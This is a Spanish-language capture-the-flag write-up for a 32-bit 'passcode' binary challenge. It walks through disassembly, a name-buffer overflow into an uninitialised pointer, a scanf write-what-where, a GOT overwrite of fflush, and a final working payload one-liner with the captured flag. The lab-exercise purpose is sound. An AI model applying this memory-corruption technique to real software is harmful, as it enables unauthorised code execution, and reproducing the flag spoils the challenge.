# passcode

![passcode](https://github.com/user-attachments/assets/138a1353-14a6-4f81-a6d1-5619ea7f3394)

La cadena `name` se almacena en `ebp-0x70`:
```
   0x08049324 <+50>:	lea    eax,[ebp-0x70]                     <----
   0x08049327 <+53>:	push   eax
   0x08049328 <+54>:	lea    eax,[ebx-0x1f8b]
   0x0804932e <+60>:	push   eax
   0x0804932f <+61>:	call   0x80490d0 <__isoc99_scanf@plt>
   0x08049334 <+66>:	add    esp,0x10
   0x08049337 <+69>:	sub    esp,0x8
   0x0804933a <+72>:	lea    eax,[ebp-0x70]
   0x0804933d <+75>:	push   eax
   0x0804933e <+76>:	lea    eax,[ebx-0x1f85]
   0x08049344 <+82>:	push   eax
   0x08049345 <+83>:	call   0x8049050 <printf@plt>            <----
   0x0804934a <+88>:	add    esp,0x10
```

Y `passcode1`, `passcode2` se almacenan en `ebp-0x10` y `ebp-0xc` respectivamente:
```
   0x0804921e <+40>:	push   DWORD PTR [ebp-0x10]
   0x08049221 <+43>:	lea    eax,[ebx-0x1fe5]
   0x08049227 <+49>:	push   eax
   0x08049228 <+50>:	call   0x80490d0 <__isoc99_scanf@plt>
   0x0804922d <+55>:	add    esp,0x10
   0x08049230 <+58>:	mov    eax,DWORD PTR [ebx-0x4]
   0x08049236 <+64>:	mov    eax,DWORD PTR [eax]
   0x08049238 <+66>:	sub    esp,0xc
   0x0804923b <+69>:	push   eax
   0x0804923c <+70>:	call   0x8049060 <fflush@plt>
   0x08049241 <+75>:	add    esp,0x10
   0x08049244 <+78>:	sub    esp,0xc
   0x08049247 <+81>:	lea    eax,[ebx-0x1fe2]
   0x0804924d <+87>:	push   eax
   0x0804924e <+88>:	call   0x8049050 <printf@plt>
   0x08049253 <+93>:	add    esp,0x10
   0x08049256 <+96>:	sub    esp,0x8
   0x08049259 <+99>:	push   DWORD PTR [ebp-0xc]
   0x0804925c <+102>:	lea    eax,[ebx-0x1fe5]
   0x08049262 <+108>:	push   eax
   0x08049263 <+109>:	call   0x80490d0 <__isoc99_scanf@plt>
```

En la entrada del nombre se consumen 100 bytes, `0x70-0x10=0x60=96` asi que los ultimos 4 bytes pueden sobreescribir `passcode1`.

Los `scanf` de los passcodes estan mal implemntados:
``` C
	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);
```

El segundo parametro deberia ser la direccion de memoria del passcode, o sea deberia usarse `&` como operador de desreferencia, sin embargo aqui se esta escribiendo `en la direccion de memoria cuyo valor contiene passcode`

Luego del `scanf` de `passcode1` se hace una llamada a `fflush`, lo que tenemos que hacer es sobreescribir el contenido de `passcode1` con la direccion de `fflush` en la GOT y luego con esta vulnerabilidad en `scanf` escribir la direccion real a la que apunta `fflush` en la GOT.

Por alguna razon pwngdb estaba fallando y no pude ejecutar el programa, asi que obtuve la direccion de `fflush` en la GOT con objdump:
```
passcode@ubuntu:~$ objdump -R passcode | grep fflush
0804c014 R_386_JUMP_SLOT   fflush@GLIBC_2.0
```

```
...
   0x0804926b <+117>:	sub    esp,0xc
   0x0804926e <+120>:	lea    eax,[ebx-0x1fcf]
   0x08049274 <+126>:	push   eax
   0x08049275 <+127>:	call   0x8049090 <puts@plt>
   0x0804927a <+132>:	add    esp,0x10
   0x0804927d <+135>:	cmp    DWORD PTR [ebp-0x10],0x1e240
   0x08049284 <+142>:	jne    0x80492ce <login+216>
   0x08049286 <+144>:	cmp    DWORD PTR [ebp-0xc],0xcc07c9
   0x0804928d <+151>:	jne    0x80492ce <login+216> 
   0x0804928f <+153>:	sub    esp,0xc                              <--- Queremos saltar aqui. donde el if se cumple y se imprime la flag
```

Como `scanf` acepta solo entrada numerica para `passcode1` tenemos que convertir esta direccion a un decimal con `python3 -c 'print(0x0804928f)'`

##### Resultado final:
```
passcode@ubuntu:~$ python3 -c 'import sys;sys.stdout.buffer.write(b"A"*96+b"\x14\xc0\x04\x08"+b"134517391")'|./passcode
Toddler's Secure Login System 1.1 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
enter passcode1 : Login OK!
s0rry_mom_I_just_ign0red_c0mp1ler_w4rning
Now I can safely trust you that you have credential :)
```

`s0rry_mom_I_just_ign0red_c0mp1ler_w4rning`
